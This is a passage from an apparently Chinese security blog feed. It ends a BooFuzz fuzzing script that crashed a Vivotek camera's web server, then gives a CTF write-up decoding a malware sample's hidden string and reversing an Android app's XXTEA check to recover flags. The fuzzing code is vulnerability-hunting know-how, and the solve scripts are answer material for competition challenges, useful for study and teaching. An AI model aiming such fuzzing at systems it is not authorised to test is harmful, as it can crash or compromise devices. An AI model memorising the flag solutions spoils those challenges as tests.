class="hljs-string">&quot;65&quot;</span>, fuzzable=<span class="hljs-literal">True</span>)<br>        <span class="hljs-comment"># End</span><br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br><br>    session.connect(s_get(<span class="hljs-string">&quot;FUZZ&quot;</span>))<br>    session.fuzz()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>可以看到在Test Case 1中没有返回，程序已经崩溃</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png" alt="5"></p><p>脚本还在运行时，可以访问localhost:26000查看本次fuzz相关信息(触发crash的case，case详细信息等)</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png" alt="6"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/jtpereyda/boofuzz">boofuzz github</a></p><p><a href="https://boofuzz.readthedocs.io/en/stable/">boofuzz手册</a></p><p><a href="https://blog.csdn.net/weixin_46222091/article/details/119334375">[csdn] BooFuzz协议漏洞挖掘入门教程与使用心得</a></p><p><a href="https://blog.csdn.net/song_lee/article/details/104334096">[csdn] IoT 设备网络协议模糊测试工具boofuzz实战</a></p><p><a href>[知乎] BooFuzz实战 Vivotek的Fuzzing 栈溢出</a></p><p><a href="https://aslr.io/2020/02/03/iot-web-server-cgi-handler-analysis/">常见嵌入式Web服务器CGI处理功能简要分析 (aslr.io)</a></p><p><a href="https://wokough.gitbook.io/iot-firmware-aio/wiki/fang-zhen-fen-xi">IOT固件安全all in one - 固件仿真</a></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>BooFuzz</tag>
      
      <tag>Vivotek</tag>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023香山杯RE&amp;PWN writeup</title>
    <link href="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/"/>
    <url>/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023香山杯RE-amp-PWN-writeup"><a href="#2023香山杯RE-amp-PWN-writeup" class="headerlink" title="2023香山杯RE&amp;PWN writeup"></a>2023香山杯RE&amp;PWN writeup</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="URL从哪来"><a href="#URL从哪来" class="headerlink" title="URL从哪来"></a>URL从哪来</h2><p>32位windows恶意软件分析</p><p>微步检测<img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231015153202.png" alt="1"></p><p>题目给的exe又在c盘生成了另一个程序并创建进程，ou.exe可以直接从微步下载，或者根据偏移提取</p><p>分析c盘中真正的恶意程序对数据进行逐位-30和base64加密</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3[0] = 120;<br>v3[1] = 139;<br>v3[2] = 150;<br>v3[3] = 134;<br>v3[4] = 120;<br>v3[5] = 81;<br>v3[6] = 145;<br>v3[7] = 80;<br>v3[8] = 108;<br>v3[9] = 98;<br>v3[10] = 119;<br>v3[11] = 83;<br>v3[12] = 108;<br>v3[13] = 136;<br>v3[14] = 99;<br>v3[15] = 80;<br>v3[16] = 120;<br>v3[17] = 113;<br>v3[18] = 78;<br>v3[19] = 80;<br>v3[20] = 107;<br>v3[21] = 152;<br>v3[22] = 119;<br>v3[23] = 83;<br>v3[24] = 106;<br>v3[25] = 114;<br>v3[26] = 119;<br>v3[27] = 151;<br>v3[28] = 108;<br>v3[29] = 139;<br>v3[30] = 119;<br>v3[31] = 146;<br>v3[32] = 108;<br>v3[33] = 152;<br>v3[34] = 99;<br>v3[35] = 80;<br>v3[36] = 109;<br>v3[37] = 113;<br>v3[38] = 78;<br>v3[39] = 81;<br>v3[40] = 108;<br>v3[41] = 98;<br>v3[42] = 119;<br>v3[43] = 150;<br>v3[44] = 108;<br>v3[45] = 152;<br>v3[46] = 95;<br>v3[47] = 80;<br>v3[48] = 107;<br>v3[49] = 114;<br>v3[50] = 129;<br>v3[51] = 81;<br>v3[52] = 108;<br>v3[53] = 136;<br>v3[54] = 100;<br>v3[55] = 87;<br>v14 = 56;<br>Block = malloc(0x39u);<span class="hljs-built_in"></span><br><span class="hljs-built_in">if </span>( !Block )<br> <span class="hljs-built_in"> return </span>1;<br>memset(Block, 0, v14 + 1);<br>for ( i = 0; i &lt; v14; ++i )<br>  *((_BYTE *)Block + i) = LOBYTE(v3[i]) - 30;<br>v13 = sub_401110((const char *)Block);<br></code></pre></td></tr></table></figure><p>写脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import <span class="hljs-built_in">base64</span><br>v3 = [<span class="hljs-number">120</span>, <span class="hljs-number">139</span>, <span class="hljs-number">150</span>, <span class="hljs-number">134</span>, <span class="hljs-number">120</span>, <span class="hljs-number">81</span>, <span class="hljs-number">145</span>, <span class="hljs-number">80</span>, <span class="hljs-number">108</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">108</span>, <span class="hljs-number">136</span>, <span class="hljs-number">99</span>, <span class="hljs-number">80</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">107</span>, <span class="hljs-number">152</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">106</span>, <span class="hljs-number">114</span>, <span class="hljs-number">119</span>, <span class="hljs-number">151</span>, <span class="hljs-number">108</span>, <span class="hljs-number">139</span>, <span class="hljs-number">119</span>, <span class="hljs-number">146</span>, <span class="hljs-number">108</span>, <span class="hljs-number">152</span>, <span class="hljs-number">99</span>, <span class="hljs-number">80</span>, <span class="hljs-number">109</span>, <span class="hljs-number">113</span>, <span class="hljs-number">78</span>, <span class="hljs-number">81</span>, <span class="hljs-number">108</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">150</span>, <span class="hljs-number">108</span>, <span class="hljs-number">152</span>, <span class="hljs-number">95</span>, <span class="hljs-number">80</span>, <span class="hljs-number">107</span>, <span class="hljs-number">114</span>, <span class="hljs-number">129</span>, <span class="hljs-number">81</span>, <span class="hljs-number">108</span>, <span class="hljs-number">136</span>, <span class="hljs-number">100</span>, <span class="hljs-number">87</span>]<br><span class="hljs-built_in">block</span> = &#x27;&#x27;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v3:<br>    <span class="hljs-built_in">block</span> += chr(i-<span class="hljs-number">30</span>)<br><br><span class="hljs-built_in">block</span> = <span class="hljs-built_in">base64</span>.b64decode(<span class="hljs-built_in">block</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">block</span>)<br></code></pre></td></tr></table></figure><h2 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h2><p>chaquopy框架app的逆向</p><p><a href="https://blog.csdn.net/wwb1990/article/details/104051068">https://blog.csdn.net/wwb1990/article/details/104051068</a></p><p>java层找到MainActivity和import导入的b.c.a.a</p><p>这里应该是类似导入python代码，可以推测python文件名应该是hello</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">s</span> <span class="hljs-operator">=</span> Python.getInstance().getModule(<span class="hljs-string">&quot;hello&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里通过callAttr调用了sayhello函数</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">s.callAttr(<span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>这里应该是监听鼠标点击按钮的事件，触发后跳转到a，即b.c.a.a</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-built_in">this</span>.p.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-type">a</span>(<span class="hljs-built_in">this</span>));<br></code></pre></td></tr></table></figure><p>找到这里，最关键的check函数是python源码中的函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void on<span class="hljs-constructor">Click(View <span class="hljs-params">view</span>)</span> &#123;<br>        Context baseContext;<br>        String str;<br>        String obj = this.f717b.r.get<span class="hljs-constructor">Text()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>        this.f717b.q.set<span class="hljs-constructor">Text(<span class="hljs-params">obj</span>)</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MainActivity</span>.</span></span>s.call<span class="hljs-constructor">Attr(<span class="hljs-string">&quot;check&quot;</span>, <span class="hljs-params">obj</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">Boolean()</span>) &#123;<br>            baseContext = this.f717b.get<span class="hljs-constructor">BaseContext()</span>;<br>            str = <span class="hljs-string">&quot;you are right~ flag is flag&#123;your input&#125;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            baseContext = this.f717b.get<span class="hljs-constructor">BaseContext()</span>;<br>            str = <span class="hljs-string">&quot;Wrong!&quot;</span>;<br>        &#125;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Toast</span>.</span></span>make<span class="hljs-constructor">Text(<span class="hljs-params">baseContext</span>, <span class="hljs-params">str</span>, 1)</span>.show<span class="hljs-literal">()</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>问了chatgpt，该框架app打包后的python代码位于assets文件夹，但是里面只有.imy文件和so文件，so文件翻了一遍，都不像是有check函数，查看imy文件时发现开头都是PK，可能是压缩包，换后缀名为rar解压发现app.imy中就是hello.py</p><p>代码都是混淆后的，用pycharm对代码进行简单的重命名，如下对check函数进行了简单去混淆，分析可得加密流程是先将字符串四个字节一组小端序转换为int数组，一共36个字符9个int，然后xxtea加密，xxtea的特征有0x9e3779b9，5234的位移，6 + 52，</p><p>这题的xxtea代码和<a href="https://blog.csdn.net/A951860555/article/details/120120400">该博客</a>的一模一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> java <span class="hljs-keyword">import</span> jboolean ,jclass <span class="hljs-comment">#line:1</span><br><span class="hljs-keyword">import</span> struct <span class="hljs-comment">#line:3</span><br><span class="hljs-keyword">import</span> ctypes <span class="hljs-comment">#line:4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span> (O0O00OOO00OO00O00 ,O0OO0O00OO0O000OO ,OO000OO000000O0O0 ,OOO00O00OOO000OOO ,OO0OOO0OOO0OOOO0O ,O0OO000O0000O000O ):<span class="hljs-comment">#line:7</span><br>    OOO000O0O0OO00000 =(O0O00OOO00OO00O00 .value &gt;&gt;<span class="hljs-number">5</span> ^O0OO0O00OO0O000OO .value &lt;&lt;<span class="hljs-number">2</span> )+(O0OO0O00OO0O000OO .value &gt;&gt;<span class="hljs-number">3</span> ^O0O00OOO00OO00O00 .value &lt;&lt;<span class="hljs-number">4</span> )<span class="hljs-comment">#line:8</span><br>    OOO0OOOOOO0O0OO00 =(OO000OO000000O0O0 .value ^O0OO0O00OO0O000OO .value )+(OOO00O00OOO000OOO [(OO0OOO0OOO0OOOO0O &amp;<span class="hljs-number">3</span> )^O0OO000O0000O000O .value ]^O0O00OOO00OO00O00 .value )<span class="hljs-comment">#line:9</span><br>    <span class="hljs-keyword">return</span> ctypes .c_uint32 (OOO000O0O0OO00000 ^OOO0OOOOOO0O0OO00 )<span class="hljs-comment">#line:11</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span> (n, <span class="hljs-built_in">input</span>, key):<span class="hljs-comment">#line:14</span><br>    O0OOO0OO00O0000OO =<span class="hljs-number">0x9e3779b9</span> <span class="hljs-comment">#line:15</span><br>    OOOO0OOOO00O0OOOO = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n <span class="hljs-comment">#line:16</span><br>    O00OO00000O0OO00O =ctypes .c_uint32 (<span class="hljs-number">0</span> )<span class="hljs-comment">#line:18</span><br>    OO0OOOO0O0O0O0OO0 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>])<span class="hljs-comment">#line:19</span><br>    OOOOO00000OOOOOOO =ctypes .c_uint32 (<span class="hljs-number">0</span> )<span class="hljs-comment">#line:20</span><br>    <span class="hljs-keyword">while</span> OOOO0OOOO00O0OOOO &gt;<span class="hljs-number">0</span> :<span class="hljs-comment">#line:22</span><br>        O00OO00000O0OO00O .value +=O0OOO0OO00O0000OO <span class="hljs-comment">#line:23</span><br>        OOOOO00000OOOOOOO .value =(O00OO00000O0OO00O .value &gt;&gt;<span class="hljs-number">2</span> )&amp;<span class="hljs-number">3</span> <span class="hljs-comment">#line:24</span><br>        <span class="hljs-keyword">for</span> OO0O0OOO000O0000O <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (n - <span class="hljs-number">1</span>):<span class="hljs-comment">#line:25</span><br>            OOO0OO00O0OO0O000 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O + <span class="hljs-number">1</span>])<span class="hljs-comment">#line:26</span><br>            <span class="hljs-built_in">input</span> [OO0O0OOO000O0000O]=ctypes .c_uint32 (<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O] + MX (OO0OOOO0O0O0O0OO0, OOO0OO00O0OO0O000, O00OO00000O0OO00O, key, OO0O0OOO000O0000O, OOOOO00000OOOOOOO).value).value <span class="hljs-comment">#line:27</span><br>            OO0OOOO0O0O0O0OO0 .value =<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O]<span class="hljs-comment">#line:28</span><br>        OOO0OO00O0OO0O000 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [<span class="hljs-number">0</span>])<span class="hljs-comment">#line:29</span><br>        <span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>]=ctypes .c_uint32 (<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>] + MX (OO0OOOO0O0O0O0OO0, OOO0OO00O0OO0O000, O00OO00000O0OO00O, key, n - <span class="hljs-number">1</span>, OOOOO00000OOOOOOO).value).value <span class="hljs-comment">#line:30</span><br>        OO0OOOO0O0O0O0OO0 .value =<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>]<span class="hljs-comment">#line:31</span><br>        OOOO0OOOO00O0OOOO -=<span class="hljs-number">1</span> <span class="hljs-comment">#line:32</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span> <span class="hljs-comment">#line:34</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span> (<span class="hljs-built_in">input</span>):<span class="hljs-comment">#line:63</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;checking~~~: &quot;</span> + <span class="hljs-built_in">input</span>)<span class="hljs-comment">#line:64</span><br>    <span class="hljs-built_in">input</span> =<span class="hljs-built_in">str</span> (<span class="hljs-built_in">input</span>)<span class="hljs-comment">#line:65</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (<span class="hljs-built_in">input</span>)!=<span class="hljs-number">36</span> :<span class="hljs-comment">#line:66</span><br>        <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">False</span> )<span class="hljs-comment">#line:67</span><br>    v1 =[]<span class="hljs-comment">#line:69</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span> ,<span class="hljs-number">36</span> ,<span class="hljs-number">4</span> ):<span class="hljs-comment">#line:70</span><br>        result = <span class="hljs-built_in">input</span> [i:i + <span class="hljs-number">4</span>].encode (<span class="hljs-string">&#x27;latin-1&#x27;</span>)<span class="hljs-comment">#line:71          每四字节按latin-1编码</span><br>        v1 .append (result )<span class="hljs-comment">#line:72</span><br>    v2 =[]<span class="hljs-comment">#line:73</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1 :<span class="hljs-comment">#line:74</span><br>        v2 .append (struct .unpack (<span class="hljs-string">&quot;&lt;I&quot;</span>,i )[<span class="hljs-number">0</span> ])<span class="hljs-comment">#line:75 将四字节int按小端序打包</span><br>    <span class="hljs-built_in">print</span> (v2 )<span class="hljs-comment">#line:77</span><br>    result =encrypt (<span class="hljs-number">9</span> ,v2 ,[<span class="hljs-number">12345678</span> ,<span class="hljs-number">12398712</span> ,<span class="hljs-number">91283904</span> ,<span class="hljs-number">12378192</span> ])<span class="hljs-comment">#line:78</span><br>    chiper =[<span class="hljs-number">689085350</span> ,<span class="hljs-number">626885696</span> ,<span class="hljs-number">1894439255</span> ,<span class="hljs-number">1204672445</span> ,<span class="hljs-number">1869189675</span> ,<span class="hljs-number">475967424</span> ,<span class="hljs-number">1932042439</span> ,<span class="hljs-number">1280104741</span> ,<span class="hljs-number">2808893494</span> ]<span class="hljs-comment">#line:85</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">9</span> ):<span class="hljs-comment">#line:86</span><br>        <span class="hljs-keyword">if</span> chiper [i ]!=result [i ]:<span class="hljs-comment">#line:87</span><br>            <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">False</span> )<span class="hljs-comment">#line:88</span><br>    <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">True</span> )<span class="hljs-comment">#line:90</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sayHello</span> ():<span class="hljs-comment">#line:92</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello from py&quot;</span>)<span class="hljs-comment">#line:93</span><br></code></pre></td></tr></table></figure><p>脚本，注意解密后需要每四字节转换端序后再转化成字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span>(<span class="hljs-params">z, y, total, key, p, e</span>):<br>    temp1 = (z.value &gt;&gt; <span class="hljs-number">5</span> ^ y.value &lt;&lt; <span class="hljs-number">2</span>) + (y.value &gt;&gt; <span class="hljs-number">3</span> ^ z.value &lt;&lt; <span class="hljs-number">4</span>)<br>    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="hljs-number">3</span>) ^ e.value] ^ z.value)<br><br>    <span class="hljs-keyword">return</span> c_uint32(temp1 ^ temp2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br><br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    z = c_uint32(v[n - <span class="hljs-number">1</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        total.value += delta<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>):<br>            y = c_uint32(v[p + <span class="hljs-number">1</span>])<br>            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value<br>            z.value = v[p]<br>        y = c_uint32(v[<span class="hljs-number">0</span>])<br>        v[n - <span class="hljs-number">1</span>] = c_uint32(v[n - <span class="hljs-number">1</span>] + MX(z, y, total, key, n - <span class="hljs-number">1</span>, e).value).value<br>        z.value = v[n - <span class="hljs-number">1</span>]<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br><br>    total = c_uint32(rounds * delta)<br>    y = c_uint32(v[<span class="hljs-number">0</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = c_uint32(v[p - <span class="hljs-number">1</span>])<br>            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value<br>            y.value = v[p]<br>        z = c_uint32(v[n - <span class="hljs-number">1</span>])<br>        v[<span class="hljs-number">0</span>] = c_uint32(v[<span class="hljs-number">0</span>] - MX(z, y, total, key, <span class="hljs-number">0</span>, e).value).value<br>        y.value = v[<span class="hljs-number">0</span>]<br>        total.value -= delta<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    k = [<span class="hljs-number">12345678</span> ,<span class="hljs-number">12398712</span> ,<span class="hljs-number">91283904</span> ,<span class="hljs-number">12378192</span> ]<br>    n = <span class="hljs-number">9</span><br>    res = [<span class="hljs-number">689085350</span> ,<span class="hljs-number">626885696</span> ,<span class="hljs-number">1894439255</span> ,<span class="hljs-number">1204672445</span> ,<span class="hljs-number">1869189675</span> ,<span class="hljs-number">475967424</span> ,<span class="hljs-number">1932042439</span> ,<span class="hljs-number">1280104741</span> ,<span class="hljs-number">2808893494</span> ]<br>    res = decrypt(n, res, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">2</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">3</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">4</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">5</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">6</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">7</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">8</span>]))<br>    v1 = [<span class="hljs-string">b&#x27;\x38\x66\x31\x63&#x27;</span>, <span class="hljs-string">b&#x27;\x36\x65\x63\x61&#x27;</span>, <span class="hljs-string">b&#x27;\x34\x62\x34\x2d&#x27;</span>, <span class="hljs-string">b&#x27;\x39\x34\x2d\x36&#x27;</span>, <span class="hljs-string">b&#x27;\x62\x2d\x31\x33&#x27;</span>, <span class="hljs-string">b&#x27;\x2d\x62\x35\x32&#x27;</span>, <span class="hljs-string">b&#x27;\x31\x30\x31\x61&#x27;</span>, <span class="hljs-string">b&#x27;\x39\x38\x61\x30&#x27;</span>, <span class="hljs-string">b&#x27;\x32\x39\x35\x63&#x27;</span>]<br>    v2 = []  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1:  <br>        v2.append(struct.unpack(<span class="hljs-string">&quot;&lt;I&quot;</span>, i)[<span class="hljs-number">0</span>])<br>    <span class="hljs-built_in">print</span>(v2)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v2[i]),end=<span class="hljs-string">&#x27; &#x27;</span>)<br>  <span class="hljs-comment">#63316638616365362d346234362d343933312d623235622d613130313061383963353932</span><br>    asc = <span class="hljs-string">&#x27;63316638616365362d346234362d343933312d623235622d613130313061383963353932&#x27;</span><br>    <span class="hljs-built_in">str</span> = binascii.unhexlify(asc)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><h2 